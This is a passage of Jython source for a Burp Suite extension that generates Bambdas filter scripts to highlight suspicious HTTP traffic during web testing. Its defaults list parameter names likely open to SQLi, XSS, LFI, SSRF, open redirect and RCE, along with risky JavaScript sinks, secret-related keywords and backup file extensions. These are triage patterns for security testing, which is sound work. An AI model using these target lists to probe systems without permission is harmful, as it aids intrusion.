        bambdas += "var pathExt = requestResponse.request().pathWithoutQuery().toLowerCase();\n"
        bambdas += "// general vars\n\n"

        if self._cbBambdasExtIgnore.isSelected():
            filterDenyList = ""
            for ext in [ext.strip() for ext in self._txtBambdasExtIgnoreKeywords.text.split(',')]:
                filterDenyList += "|" + ext;
            if filterDenyList[1:]:
                bambdas += "// Black-Listed file extensions\n"
                bambdas += "if (Pattern.compile(\"\\\\.(" + filterDenyList[1:] + ")$\", Pattern.CASE_INSENSITIVE).matcher(pathExt).find())\n"
                bambdas += "    return false;\n"
                bambdas += "// Black-Listed file extensions\n\n"

        if (self._cbBambdasSearchinReq.isSelected() or self._cbBambdasSearchinURL.isSelected()) and (self._cbBambdasSQLi.isSelected() or self._cbBambdasXSS.isSelected() or self._cbBambdasLFI.isSelected() or self._cbBambdasSSRF.isSelected() or self._cbBambdasORed.isSelected() or self._cbBambdasRCE.isSelected()):
            bambdas += "// Suspicious parameters OWASP Top 25\n"
            bambdas += "Map<String, List<String>> attacksKeyWords = new HashMap<>();\n"
            bambdas += "String[] paramsArray;\n"
            bambdas += "List<String> paramsArrayTrimmed = new ArrayList<>();\n\n"
        
            if self._cbBambdasSQLi.isSelected():
                bambdas += "// SQLi suspicious keywords\n"
                bambdas += "paramsArrayTrimmed = new ArrayList<>();\n"
                bambdas += "String textSQLi = \"" + self._txtBambdasSQLiKeywords.text.strip() + "\";\n"
                bambdas += "paramsArray = textSQLi.split(\",\\s*\");\n"
                bambdas += "for (String paramArray : paramsArray)\n"
                bambdas += "    if(!paramArray.trim().isEmpty())\n"
                bambdas += "        paramsArrayTrimmed.add(paramArray.trim());\n"
                bambdas += "attacksKeyWords.put(\"SQLi\", new ArrayList<>(paramsArrayTrimmed));\n"
                bambdas += "// SQLi suspicious keywords\n\n"

            if self._cbBambdasXSS.isSelected():
                bambdas += "// XXS suspicious keywords\n"
                bambdas += "paramsArrayTrimmed = new ArrayList<>();\n"
                bambdas += "String textXSS = \"" + self._txtBambdasXSSKeywords.text.strip() + "\";\n"
                bambdas += "paramsArray = textXSS.split(\",\\s*\");\n"
                bambdas += "for (String paramArray : paramsArray)\n"
                bambdas += "    if(!paramArray.trim().isEmpty())\n"
                bambdas += "        paramsArrayTrimmed.add(paramArray.trim());\n"
                bambdas += "attacksKeyWords.put(\"XSS\", new ArrayList<>(paramsArrayTrimmed));\n"
                bambdas += "// XXS suspicious keywords\n\n"

            if self._cbBambdasLFI.isSelected():
                bambdas += "// LFI suspicious keywords\n"
                bambdas += "paramsArrayTrimmed = new ArrayList<>();\n"
                bambdas += "String textLFI = \"" + self._txtBambdasLFIKeywords.text.strip() + "\";\n"
                bambdas += "paramsArray = textLFI.split(\",\\s*\");\n"
                bambdas += "for (String paramArray : paramsArray)\n"
                bambdas += "    if(!paramArray.trim().isEmpty())\n"
                bambdas += "        paramsArrayTrimmed.add(paramArray.trim());\n"
                bambdas += "attacksKeyWords.put(\"LFI\", new ArrayList<>(paramsArrayTrimmed));\n"
                bambdas += "// LFI suspicious keywords\n\n"

            if self._cbBambdasSSRF.isSelected():
                bambdas += "// SSRF suspicious keywords\n"
                bambdas += "paramsArrayTrimmed = new ArrayList<>();\n"
                bambdas += "String textSSRF = \"" + self._txtBambdasSSRFKeywords.text.strip() + "\";\n"
                bambdas += "paramsArray = textSSRF.split(\",\\s*\");\n"
                bambdas += "for (String paramArray : paramsArray)\n"
                bambdas += "    if(!paramArray.trim().isEmpty())\n"
                bambdas += "        paramsArrayTrimmed.add(paramArray.trim());\n"
                bambdas += "attacksKeyWords.put(\"SSRF\", new ArrayList<>(paramsArrayTrimmed));\n"
                bambdas += "// SSRF suspicious keywords\n\n"

            if self._cbBambdasORed.isSelected():
                bambdas += "// OR suspicious keywords\n"
                bambdas += "paramsArrayTrimmed = new ArrayList<>();\n"
                bambdas += "String textOR = \"" + self._txtBambdasORedKeywords.text.strip() + "\";\n"
                bambdas += "paramsArray = textOR.split(\",\\s*\");\n"
                bambdas += "for (String paramArray : paramsArray)\n"
                bambdas += "    if(!paramArray.trim().isEmpty())\n"
                bambdas += "        paramsArrayTrimmed.add(paramArray.trim());\n"
                bambdas += "attacksKeyWords.put(\"OpenRedirect\", new ArrayList<>(paramsArrayTrimmed));\n"
                bambdas += "// OR suspicious keywords\n\n"

            if self._cbBambdasRCE.isSelected():
                bambdas += "// RCE suspicious keywords\n"
                bambdas += "paramsArrayTrimmed = new ArrayList<>();\n"
                bambdas += "String textRCE = \"" + self._txtBambdasRCEKeywords.text.strip() + "\";\n"
                bambdas += "paramsArray = textRCE.split(\",\\s*\");\n"
                bambdas += "for (String paramArray : paramsArray)\n"
                bambdas += "    if(!paramArray.trim().isEmpty())\n"
                bambdas += "        paramsArrayTrimmed.add(paramArray.trim());\n"
                bambdas += "attacksKeyWords.put(\"RCE\", new ArrayList<>(paramsArrayTrimmed));\n"
                bambdas += "// RCE suspicious keywords\n\n"

            bambdas += "// Suspicious parameters OWASP Top 25\n"

        if self._cbBambdasHTTPMethods.isSelected():
            httpMethods = "{"
            for httpMtd in [httpMtd.strip() for httpMtd in self._txtBambdasHTTPMethods.text.strip().split(',')]:
                if httpMtd:
                    httpMethods += "\"" + httpMtd + "\", "
            if httpMethods != "{":
                httpMethods = httpMethods[:-2] 
            httpMethods += "}"
            bambdas += "// HTTP methods to ignore\n"
            bambdas += "String[] httpMethods = " + httpMethods + ";\n"
            bambdas += "// HTTP methods to ignore\n\n"
        
        if self._cbBambdasValuable.isSelected() and (self._cbBambdasSearchinReq.isSelected() or self._cbBambdasSearchinRes.isSelected() or self._cbBambdasSearchinURL.isSelected()):
            bambdas += "// Important keywords will be searched\n"
            highValueWords = "{"
            for valueWords in [valueWords.strip() for valueWords in self._txtBambdasValuable.text.strip().split(',')]:
                if valueWords:
                    highValueWords += "\"" + valueWords + "\", "
            if highValueWords != "{":
                highValueWords = highValueWords[:-2] 
            highValueWords += "}"
            bambdas += "String[] highValueWords = " + highValueWords + ";\n"
            bambdas += "// Important keywords will be searched\n\n"

        if self._cbBambdasSearchinRes.isSelected():
            if self._cbBambdasVulnJS.isSelected():
                vulnJSFunc = "{"
                for vulnJS in [vulnJS.strip() for vulnJS in self._txtBambdasVulnJSKeywords.text.strip().replace(".","\\\\.").replace("(","\\\\(").split(',')]:
                    if vulnJS:
                        vulnJSFunc += "\"" + vulnJS + "\", "
                if vulnJSFunc != "{":
                    vulnJSFunc = vulnJSFunc[:-2] 
                vulnJSFunc += "}"
                bambdas += "// Suspicious Functions JS functions\n"
                bambdas += "String[] suspiciousFunctions = " + vulnJSFunc + ";\n"
                bambdas += "// Suspicious Functions JS functions\n\n"

            if self._cbBambdasFilesDownloadable.isSelected():
                fileExtensions = "{"
                for ext in [ext.strip() for ext in self._txtBambdasFilesDownloadable.text.strip().split(',')]:
                    if ext:
                        fileExtensions += "\"" + ext + "\", "
                if fileExtensions != "{":
                    fileExtensions = fileExtensions[:-2] 
                fileExtensions += "}"
                bambdas += "// Downloadable file checks\n"
                bambdas += "String[] fileExtensions = " + fileExtensions + ";\n"
                bambdas += "// Downloadable file checks\n\n"

        if self._tbBambdasBlackListedURLs.getText() != '/':
            bambdas += "// Black-Listed / Unwanted URLs\n"
            bambdas += "for (String targetPath : targetBlackListUrls)\n"
            bambdas += "    if (targetPath != null && !targetPath.trim().isEmpty() && Pattern.compile(targetPath, Pattern.CASE_INSENSITIVE).matcher(path).find())\n"
            bambdas += "        return false;\n"
            bambdas += "// Black-Listed / Unwanted URLs\n"

        if self._cbBambdasHTTPMethods.isSelected():
            bambdas +="""
// HTTP methods to ignore
for (String httpMethod : httpMethods)
    if (requestResponse.request().method().equalsIgnoreCase(httpMethod))
        return false;
// HTTP methods to ignore\n
"""
        else:
            bambdas += "\n"
        
        bambdas += "// How many days to display\n"
        bambdas += " if (!requestResponse.time().isAfter(ZonedDateTime.now().minusDays(" + self._cbBambdasDisplayDays.getSelectedItem().split()[0] + ")))\n"
        bambdas += "    return false;\n"
        bambdas += "// How many days to display\n\n"

        bambdas += "// How many days to process\n"
        bambdas += "if (requestResponse.time().isAfter(ZonedDateTime.now().minusDays(" + self._cbBambdasProcessDays.getSelectedItem().split()[0] + "))){\n"
        
        if self._cbBambdasValuable.isSelected():
            bambdas += "\tList<Pattern> patterns = new ArrayList<>();"
            bambdas += """
    for (String highValueWord : highValueWords)
        patterns.add(Pattern.compile(highValueWord, Pattern.CASE_INSENSITIVE));
"""
            if self._cbBambdasSearchinRes.isSelected():
                bambdas += """
    // ValuableWord check from response
    for (Pattern pattern : patterns)
        if (pattern.matcher(responseBody).find()){
            suspiciousHit = true;
            if (notesBuilder.length() > 0)
                notesBuilder.append(", ");
            notesBuilder.append(pattern + "(ValuableWord-Res)");
        }
    // check from response
"""
            if self._cbBambdasSearchinReq.isSelected():
                bambdas += """
    // ValuableWord check from request
    for (Pattern pattern : patterns)
        if (pattern.matcher(requestBody).find()){
            suspiciousHit = true;
            if (notesBuilder.length() > 0)
                notesBuilder.append(", ");
            notesBuilder.append(pattern + "(ValuableWord-Req)");
        }
    // ValuableWord check from request
"""
            if self._cbBambdasSearchinURL.isSelected():
                bambdas += """
    // ValuableWord check from url
    for (Pattern pattern : patterns)
        if (pattern.matcher(path).find()){
            suspiciousHit = true;
            if (notesBuilder.length() > 0)
                notesBuilder.append(", ");
            notesBuilder.append(pattern + "(ValuableWord-Url)");
        }
    // ValuableWord check from url
"""
        if self._cbBambdasSearchinRes.isSelected():
            if not self._cbBambdasValuable.isSelected():
                bambdas += "\tList<Pattern> patterns = new ArrayList<>();"

            if self._cbBambdasFilesDownloadable.isSelected():
                bambdas += """
    // LFI-Content
    patterns = new ArrayList<>();
    for (String ext : fileExtensions)
        // patterns.add(Pattern.compile("/[^\\\\s/]+\\\\." + ext, Pattern.CASE_INSENSITIVE));
        // patterns.add(Pattern.compile("<a\\\\s+href=\\"[^\\"]+\\\\." + ext + "\\"", Pattern.CASE_INSENSITIVE));
        // patterns.add(Pattern.compile("/[^\\"'\\\\s<>]+\\\\." + ext+ "(?=[\\\\s\\"])", Pattern.CASE_INSENSITIVE));
        patterns.add(Pattern.compile("[\\\\s/>]?[^\\"'\\\\s<>]+\\\\." + ext + "(?=[\\\\s\\"])", Pattern.CASE_INSENSITIVE));

    ArrayList<String> matchingFiles = new ArrayList<>();
    // Check from response
    for (Pattern pattern : patterns) {
        Matcher matcher = pattern.matcher(responseBody);
        while (matcher.find()) {
            suspiciousHit = true;
            String matchingFile = matcher.group();
            matchingFiles.add(matchingFile);
            if (notesBuilder.length() > 0)
                notesBuilder.append(", ");
            notesBuilder.append(matchingFile.strip().replace(">", "").replace("\\"", "")).append("(LFI-Content)");
        }
    }
    // Check from response
    // LFI-Content
"""
            if self._cbBambdasSearchHTMLCommnets.isSelected():
                bambdas += """
    // Search HTML comments
    patterns = new ArrayList<>();
    patterns.add(Pattern.compile(\"<!--.*?-->\", Pattern.DOTALL));
    ArrayList<String> matchingComments = new ArrayList<>();
    // check from response
    for (Pattern pattern : patterns) {
        Matcher matcher = pattern.matcher(responseBody);
        while (matcher.find()) {
            suspiciousHit = true;
            String matchingComment = matcher.group();
            matchingComments.add(matchingComment);
            if (notesBuilder.length() > 0)
                notesBuilder.append(\", \");
            notesBuilder.append(matchingComment).append(\"(HTML-Comment)\");
        }
    }
    // Search HTML comments
"""

            if self._cbBambdasVulnJS.isSelected():
                bambdas += """
    // Suspicious Functions JS functions - Vulnerable JS
    patterns = new ArrayList<>();
    for (String suspiciousFunction : suspiciousFunctions)
        patterns.add(Pattern.compile(suspiciousFunction, Pattern.CASE_INSENSITIVE));
    // check from response
    for (Pattern pattern : patterns) {
        if (pattern.matcher(responseBody).find()){
                suspiciousHit = true;
                if (notesBuilder.length() > 0)
                    notesBuilder.append(", ");
                notesBuilder.append(pattern.toString().replace("\\\\", "")  + "(VulnJSFunc)");
            }
    }
    // check from response
    // Suspicious Functions JS functions - Vulnerable JS
"""
        if (self._cbBambdasSearchinURL.isSelected() or self._cbBambdasSearchinReq.isSelected()) and (self._cbBambdasSQLi.isSelected() or self._cbBambdasXSS.isSelected() or self._cbBambdasLFI.isSelected() or self._cbBambdasSSRF.isSelected() or self._cbBambdasORed.isSelected() or self._cbBambdasRCE.isSelected()):
            if not self._cbBambdasValuable.isSelected() and not self._cbBambdasSearchinRes.isSelected():
                bambdas += "\tList<Pattern> patterns = new ArrayList<>();"

            bambdas += """
    // Suspicious parameters OWASP Top 25
    for (Map.Entry<String, List<String>> entry : attacksKeyWords.entrySet()) {
        String attackType = entry.getKey();                     //Attack type
        List<String> attackParams = entry.getValue();           //all keywords/parameters
        boolean htmlContent = false;
        patterns = new ArrayList<>();
        // if (responseBody.startsWith("<"))
        if (requestBody.startsWith("<"))
            // XML content
            for (String attackParam : attackParams)
                patterns.add(Pattern.compile("<" + attackParams + ">", Pattern.CASE_INSENSITIVE));

        // else if (responseBody.startsWith("{"))
        else if (requestBody.startsWith("{"))
            // JSON content
            for (String attackParam : attackParams)
                patterns.add(Pattern.compile("\\\"" + attackParam + "\\\"", Pattern.CASE_INSENSITIVE));

        else {
            // HTML content
            htmlContent = true;
            for (String attackParam : attackParams)
                patterns.add(Pattern.compile(attackParam, Pattern.CASE_INSENSITIVE));
        }

        if (htmlContent)
            // Regular html content
            for (String attackParam : attackParams)
            {
"""
            if self._cbBambdasSearchinURL.isSelected():
                bambdas += """
                if (requestResponse.request().hasParameter(attackParam, HttpParameterType.URL)){
                    suspiciousHit = true;
                    if (notesBuilder.length() > 0)
                        notesBuilder.append(", ");
                    notesBuilder.append(attackParam + "(" + attackType + "-Url)");
                }
"""
            if self._cbBambdasSearchinReq.isSelected():
                bambdas += """
                if (requestResponse.request().hasParameter(attackParam, HttpParameterType.BODY)){
                    suspiciousHit = true;
                    if (notesBuilder.length() > 0)
                        notesBuilder.append(", ");
                    notesBuilder.append(attackParam + "(" + attackType + "-Req)");
                }
"""
            bambdas += "\t\t\t}\n"
                
            if self._cbBambdasSearchinReq.isSelected():
                bambdas += """
        else
            // Either json or xml
            for (Pattern pattern : patterns)
                if (pattern.matcher(requestBody).find()){
                    suspiciousHit = true;
                    if (notesBuilder.length() > 0)
                        notesBuilder.append(", ");
                    notesBuilder.append(pattern.toString().replace("\\\\", "") + "(" + attackType + "-Req)");
                }
"""
            bambdas +="\t}\n"
            bambdas +="\t// Suspicious parameters OWASP Top 25\n\n"

        if self._cbBambdasforWhat.getSelectedIndex() == 0:
            bambdas +="\n\t// Highlights suspicious calls\n"
            bambdas += "\tif (suspiciousHit) {\n"
            if self._cbBambdasColorKeyWords.getSelectedIndex() != 0:
                bambdas += "\t\trequestResponse.annotations().setHighlightColor(HighlightColor."+ self._cbBambdasColorKeyWords.getSelectedItem() + ");\n"
            bambdas += """
        if (notesBuilder.length() > 0)
            requestResponse.annotations().setNotes("Suspicious: " + notesBuilder.toString());
    }
    // Highlights suspicious calls
"""
        if self._cbBambdasforWhat.getSelectedIndex() == 0:
            if self._cbBambdasColorScope.getSelectedIndex() != 0:
                bambdas += """
    // Highlights URLs in the scope
    for (String targetPath : targetPaths)
        if (Pattern.compile(targetPath, Pattern.CASE_INSENSITIVE).matcher(path).find() && targetPath != null && !targetPath.trim().isEmpty()){
"""
                bambdas += "\t\t\trequestResponse.annotations().setHighlightColor(HighlightColor."+ self._cbBambdasColorScope.getSelectedItem() + ");"
                bambdas += """
            break;
        }
    // Highlights URLs in the scope
"""
        if self._cbBambdasforWhat.getSelectedIndex() == 0:
            if self._cbBambdasColorScopeSecondary.getSelectedIndex() != 0:
                bambdas += """
    // Highlights tested URLs
    for (String targetPath : targetPathsDone)
        if (Pattern.compile(targetPath, Pattern.CASE_INSENSITIVE).matcher(path).find() && targetPath != null && !targetPath.trim().isEmpty()){
"""
                bambdas += "\t\t\trequestResponse.annotations().setHighlightColor(HighlightColor."+ self._cbBambdasColorScopeSecondary.getSelectedItem() + ");"
                bambdas += """
            break;
        }
    // Highlights tested URLs
"""
        if self._tbBambdasBlackListedURLs.getText() == '/':
            bambdas += """
    // Root black-listed has been selected, all other URLs will be ignored
    if (!suspiciousHit) {
        boolean matchedScope = false;
        boolean matchedDone = false;
    
        for (String targetPath : targetPaths) {
            if (Pattern.compile(targetPath, Pattern.CASE_INSENSITIVE).matcher(path).find() &&
                targetPath != null && !targetPath.trim().isEmpty()) {
                matchedScope = true;
                break;
            }
        }
    
        for (String targetPath : targetPathsDone) {
            if (Pattern.compile(targetPath, Pattern.CASE_INSENSITIVE).matcher(path).find() &&
                targetPath != null && !targetPath.trim().isEmpty()) {
                matchedDone = true;
                break;
            }
        }
    
        if (!matchedScope && !matchedDone) {
            return false;
        }
    }
    // Root black-listed has been selected, all other URLs will be ignored
"""
        bambdas += """
    return true;
// How many days to process
}
else
    return false;
"""
        allUrls = False
        allUrlsBlacklisted = False
        if sum(1 for line in self._tbBambdasScopeURLs.text.splitlines() if line.strip() == '/') == 1 or self._tbBambdasScopeURLs.text == self._txBambdasScopeURLs or self._tbBambdasScopeURLs.text.strip() == "":
            allUrls = True
        if sum(1 for line in self._tbBambdasBlackListedURLs.text.splitlines() if line.strip() == '/') == 1:
            allUrlsBlacklisted = True

        self._lblBambdasNotification2.setForeground(Color.black)
        if allUrls:
            self._lblBambdasNotification2.text = "The script has been generated and copied to the clipboard. It includes all endpoints, with '"  + str(sum(1 for line in self._tbBambdasScopeDoneURLs.text.splitlines() if line.strip().startswith('/'))) + "' tested, and '" + str(sum(1 for line in self._tbBambdasBlackListedURLs.text.splitlines() if line.strip().startswith('/'))) + "' blacklisted."
        else:
            if allUrlsBlacklisted:
                self._lblBambdasNotification2.text = "The script has been generated and copied to the clipboard. It includes '" + str(sum(1 for line in self._tbBambdasScopeURLs.text.splitlines() if line.strip().startswith('/'))) + "' scoped, and '" + str(sum(1 for line in self._tbBambdasScopeDoneURLs.text.splitlines() if line.strip().startswith('/'))) + "' tested endpoints - the rest are hidden."
            else:
                self._lblBambdasNotification2.text = "The script has been generated and copied to the clipboard. It includes '" + str(sum(1 for line in self._tbBambdasScopeURLs.text.splitlines() if line.strip().startswith('/'))) + "' scoped, '" + str(sum(1 for line in self._tbBambdasScopeDoneURLs.text.splitlines() if line.strip().startswith('/'))) + "' tested, and '" + str(sum(1 for line in self._tbBambdasBlackListedURLs.text.splitlines() if line.strip().startswith('/'))) + "' blacklisted endpoints."

        print str(self._lblBambdasNotification2.text)

        self.updateBambdasScriptText(bambdas)

        clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
        clipboard.setContents(StringSelection(bambdas), None)

        return

    def updateBambdasScriptText(self, javaCode):
        
        doc = self._tbBambdasScript.getStyledDocument()
        doc.remove(0, doc.getLength())

        # Define styles
        style_default = StyleContext.getDefaultStyleContext().getStyle(StyleContext.DEFAULT_STYLE)

        style_comment = doc.addStyle("comment", style_default)
        StyleConstants.setForeground(style_comment, Color(0, 150, 0))

        style_string = doc.addStyle("string", style_default)
        StyleConstants.setForeground(style_string, Color(0, 102, 204))

        style_annotation = doc.addStyle("annotation", style_default)
        StyleConstants.setForeground(style_annotation, Color(160, 100, 100))

        style_keyword = doc.addStyle("keyword", style_default)
        StyleConstants.setForeground(style_keyword, Color(153, 0, 153))

        style_normal = doc.addStyle("normal", style_default)
        StyleConstants.setForeground(style_normal, Color.BLACK)

        # Define regex patterns in priority order
        patterns = [
            (r'/\*[\s\S]*?\*/', style_comment),  # Multi-line comments
            (r'//.*', style_comment),            # Single-line comments
            (r'"(?:\\.|[^"\\])*"', style_string),# Strings
            (r'@\w+', style_annotation),         # Annotations
            (r'\b(?:if|else|for|String|return|true|false)\b', style_keyword), # Selected keywords
        ]

        while javaCode:
            match_obj = None
            match_start = len(javaCode)
            match_end = len(javaCode)
            match_style = style_normal

            # Find earliest match
            for pattern, style in patterns:
                m = re.search(pattern, javaCode)
                if m and m.start() < match_start:
                    match_obj = m
                    match_start = m.start()
                    match_end = m.end()
                    match_style = style

            if match_obj:
                # Insert text before match (normal style)
                if match_start > 0:
                    doc.insertString(doc.getLength(), javaCode[:match_start], style_normal)

                # Insert matched text (styled)
                doc.insertString(doc.getLength(), javaCode[match_start:match_end], match_style)

                # Move past matched text
                javaCode = javaCode[match_end:]
            else:
                # No more matches, insert rest as normal
                doc.insertString(doc.getLength(), javaCode, style_normal)
                break

        # Scroll to top after inserting text
        self._tbBambdasScript.setCaretPosition(0)


    def funcBambdasUIReset(self, ev):
        self._lblBambdasNotification2.setForeground (Color.black)
        self._lblBambdasNotification2.text = "Click 'Run' to generate Bambdas Script!"
        self._cbBambdasColorScope.setSelectedIndex(7)
        self._cbBambdasforWhat.setSelectedIndex(0)
        self._cbBambdasColorScopeSecondary.setSelectedIndex(9)
        self._cbBambdasColorKeyWords.setSelectedIndex(0)
        self._cbBambdasDisplayDays.setSelectedIndex(3)
        self._cbBambdasProcessDays.setSelectedIndex(2)
        self._tbBambdasScopeURLs.setText(self._txBambdasScopeURLs)
        self._tbBambdasScopeDoneURLs.setText(self._txBambdasScopeDoneURLs)
        self._tbBambdasBlackListedURLs.setText(self._txBambdasBlackListedURLs)
        self._tbBambdasScopeURLs.setForeground(Color.GRAY)
        self._tbBambdasScopeDoneURLs.setForeground(Color.GRAY)
        self._tbBambdasBlackListedURLs.setForeground(Color.GRAY)
        self.updateBambdasScriptText("/* Bambdas Script will be in here automatically */")
        self._cbBambdasScope.setSelected(False)
        self._cbBambdasExtIgnore.setSelected(True)
        self._cbBambdasDisplayDays.setEnabled(True)
        self._cbBambdasProcessDays.setEnabled(True)
        self._cbBambdasSearchinReq.setSelected(False)
        self._cbBambdasSearchinRes.setSelected(False)
        self._cbBambdasSearchinURL.setSelected(False)
        
        self._cbBambdasSearchHTMLCommnets.setSelected(False)
        
        self._txtBambdasExtIgnoreKeywords.text = "js, gif, jpg, png, svg, css, ico, woff2"
        self._txtBambdasExtIgnoreKeywords.setEnabled(True)
        self._cbBambdasExtIgnore.setSelected(True)

        self._txtBambdasHTTPMethods.text = "HEAD, OPTIONS"
        self._txtBambdasHTTPMethods.setEnabled(True)
        self._cbBambdasHTTPMethods.setSelected(True)
        
        self._txtBambdasValuable.text = "debug, admin, config, secret, token, password, hash, credential"
        self._txtBambdasValuable.setEnabled(False)
        self._cbBambdasValuable.setSelected(False)

        self._txtBambdasFilesDownloadable.text = "back, backup, bak, bin, cache, conf, config, csv, doc, docx, gz, inc, ini, jar, log, old, pdf, ppt, pptx, rar, readme, tar, txt, xls, xlsx, zip, 7z"
        self._txtBambdasFilesDownloadable.setEnabled(False)
        self._cbBambdasFilesDownloadable.setSelected(False)

        self._txtBambdasSQLiKeywords.text = "category, id, item, message, name, news, page, password, q, query, report, s, search, thread, user, username, view"
        self._txtBambdasSQLiKeywords.setEnabled(False)
        self._cbBambdasSQLi.setSelected(False)

        self._txtBambdasXSSKeywords.text = "comment, content, description, id, key, keyword, keywords, l, lang, message, name, p, page, q, query, s, search, username"
        self._txtBambdasXSSKeywords.setEnabled(False)
        self._cbBambdasXSS.setSelected(False)

        self._txtBambdasLFIKeywords.text = "conf, content, detail, dir, doc, document, download, file, folder, inc, include, locate, page, path, show, template, url, view, read, load"
        self._txtBambdasLFIKeywords.setEnabled(False)
        self._cbBambdasLFI.setSelected(False)

        self._txtBambdasSSRFKeywords.text = "callback, dest, destination, host, next, out, path, redirect, return, site, target, to, uri, url, view"
        self._txtBambdasSSRFKeywords.setEnabled(False)
        self._cbBambdasSSRF.setSelected(False)

        self._txtBambdasORedKeywords.text = "dest, destination, go, next, out, redir, redirect, redirect_uri, redirect_url, return, return_path, return_to, returnTo, returnUrl, target, to, uri, url"
        self._txtBambdasORedKeywords.setEnabled(False)
        self._cbBambdasORed.setSelected(False)

        self._txtBambdasRCEKeywords.text = "arg, cmd, code, command, exe, exec, execute, ping, print, process, run"
        self._txtBambdasRCEKeywords.setEnabled(False)
        self._cbBambdasRCE.setSelected(False)

        self._txtBambdasVulnJSKeywords.text = "eval(, setTimeout(, setInterval(, document.write(, innerHTML, document.createElement(, document.execCommand(, document.domain, window.location.href, document.cookie, document.URL, document.referrer, window.open(, document.body.innerHTML, element.setAttribute(, element.outerHTML, XMLHttpRequest(, fetch(, navigator.sendBeacon("
        self._txtBambdasVulnJSKeywords.setEnabled(False)
        self._cbBambdasVulnJS.setSelected(False)

        self._cbBambdasSearchinReqFunc(self)
        self._cbBambdasSearchinResFunc(self)
        self._cbBambdasSearchinURLFunc(self)
        return


    def _tabBambdasUI(self):
        self._btnBambdasRun = JButton("Run", actionPerformed=self.funcBambdasRun)
        self._btnBambdasRun.setToolTipText("Generate the Bambdas Script.")
        self._btnBambdasReset = JButton("Reset", actionPerformed=self.funcBambdasUIReset)
        self._btnBambdasReset.setToolTipText("Reset the screen content.")

        self._lblBambdasforWhat = JLabel("Bambdas Script for")
        self._lblBambdasforWhat.setToolTipText("Bambdas Script for what!")
        self._cbBambdasforWhat = JComboBox(('View filter - HTTP history', 'Capture Filter'))
        self._cbBambdasforWhat.setEnabled(False)
        
        self._lblBambdasScope = JLabel("Process only items in scope")
        self._cbBambdasScope = JCheckBox('', False)
        self._lblBambdasScope.setToolTipText("You can display either only project-scoped items, or everything")
        self._cbBambdasScope.setToolTipText("You can display either only project-scoped items, or everything")
        
        self._txtBambdasSearchHTMLCommnets = JTextField("The search will occur between the '<!--' and '-->' tags.", 100)
        self._txtBambdasSearchHTMLCommnets.setEnabled(False)
        self._cbBambdasSearchHTMLCommnets = JCheckBox('Search HTML comments', False)
        # self._cbBambdasSearchHTMLCommnets.setEnabled(False)
        self._txtBambdasSearchHTMLCommnets.setToolTipText("Search HTML comments")
        self._cbBambdasSearchHTMLCommnets.setToolTipText("Search HTML comments")

        self._lblBambdasNotification1 = JLabel(" ")
        self._lblBambdasNotification2 = JLabel("Click 'Run' to generate Bambdas Script!")

        self._lblBambdasColorScope = JLabel("Color for testing scope")
        self._cbBambdasColorScope = JComboBox(('NONE', 'BLUE', 'CYAN', 'GRAY', 'GREEN', 'MAGENTA', 'ORANGE', 'PINK', 'RED', 'YELLOW'))
        # self._cbBambdasColorScope.setSelectedIndex(7)
        self._lblBambdasColorScope.setToolTipText("Which color to highlight 'White-list' URLs?")
        self._cbBambdasColorScope.setToolTipText("Which color to highlight 'White-list' URLs?")
        
        self._lblBambdasColorScopeSecondary = JLabel("Color for tested items")
        self._cbBambdasColorScopeSecondary = JComboBox(('NONE', 'BLUE', 'CYAN', 'GRAY', 'GREEN', 'MAGENTA', 'ORANGE', 'PINK', 'RED', 'YELLOW'))
        # self._cbBambdasColorScopeSecondary.setSelectedIndex(9)
        self._cbBambdasColorScopeSecondary.setToolTipText("Which color to highlight for Already Tested URLs?")
        self._lblBambdasColorScopeSecondary.setToolTipText("Which color to highlight for Already Tested URLs?")

        self._lblBambdasColorKeyWords = JLabel("Color for parameters/keywords")
        self._cbBambdasColorKeyWords = JComboBox(('NONE', 'BLUE', 'CYAN', 'GRAY', 'GREEN', 'MAGENTA', 'ORANGE', 'PINK', 'RED', 'YELLOW'))
        self._lblBambdasColorKeyWords.setToolTipText("Any color if keywords match")
        self._cbBambdasColorKeyWords.setToolTipText("Any color if keywords match")
    
        self._lblBambdasSearchScope = JLabel("Search parameters only")
        self._lblBambdasSearchScope.setToolTipText("Where are keywords seached?")
        self._cbBambdasSearchinURL = JCheckBox('in URL', False, itemStateChanged=self._cbBambdasSearchinURLFunc)
        self._cbBambdasSearchinURL.setToolTipText("Keywords will be searched in URLs")
        self._cbBambdasSearchinReq = JCheckBox('in Requests', False, itemStateChanged=self._cbBambdasSearchinReqFunc)
        self._cbBambdasSearchinReq.setToolTipText("Keywords will be searched in Requests")
        self._cbBambdasSearchinRes = JCheckBox('in Responses', False, itemStateChanged=self._cbBambdasSearchinResFunc)
        self._cbBambdasSearchinRes.setToolTipText("Keywords will be searched in Responses")

        self._lblBambdasDisplayDays = JLabel("Display last how many days")
        self._cbBambdasDisplayDays = JComboBox(('1 Day', '2 Days', '3 Days', '7 Days', '30 Days', '365 Days'))
        # self._cbBambdasDisplayDays.setSelectedIndex(3)
        self._lblBambdasDisplayDays.setToolTipText("How many days to display")
        self._cbBambdasDisplayDays.setToolTipText("How many days to display")
        self._lblBambdasProcessDays = JLabel("Process last how many days")
        self._cbBambdasProcessDays = JComboBox(('1 Day', '2 Days', '3 Days', '7 Days', '30 Days', '365 Days'))
        # self._cbBambdasProcessDays.setSelectedIndex(2)
        self._lblBambdasProcessDays.setToolTipText("How many days to process?")
        self._cbBambdasProcessDays.setToolTipText("How many days to process?")

        self._cbBambdasHTTPMethods = JCheckBox('HTTP methods to ignore.', True, itemStateChanged=self._cbBambdasHTTPMethodsFunc)
        self._txtBambdasHTTPMethods = JTextField("", 100)
        self._cbBambdasHTTPMethods.setToolTipText("Which HTTP methods will be ignored?")
        self._txtBambdasHTTPMethods.setToolTipText("Which HTTP methods will be ignored?")
        # self._txtBambdasHTTPMethods.setEnabled(True)

        self._cbBambdasValuable = JCheckBox('Valuable keywords', False, itemStateChanged=self._cbBambdasValuableFunc)
        self._txtBambdasValuable = JTextField("", 100)
        self._txtBambdasValuable.setToolTipText("Important keywords to filter")
        self._cbBambdasValuable.setToolTipText("Important keywords to filter")
        # self._txtBambdasValuable.setEnabled(False)
        # self._cbBambdasValuable.setEnabled(False)
        
        self._cbBambdasFilesDownloadable = JCheckBox('Downloadable file extensions', False, itemStateChanged=self._cbBambdasFilesDownFunc)
        self._txtBambdasFilesDownloadable = JTextField("", 100)
        self._txtBambdasFilesDownloadable.setToolTipText("Common file extensions to download")
        self._cbBambdasFilesDownloadable.setToolTipText("Common file extensions to download")
        # self._txtBambdasFilesDownloadable.setEnabled(False)
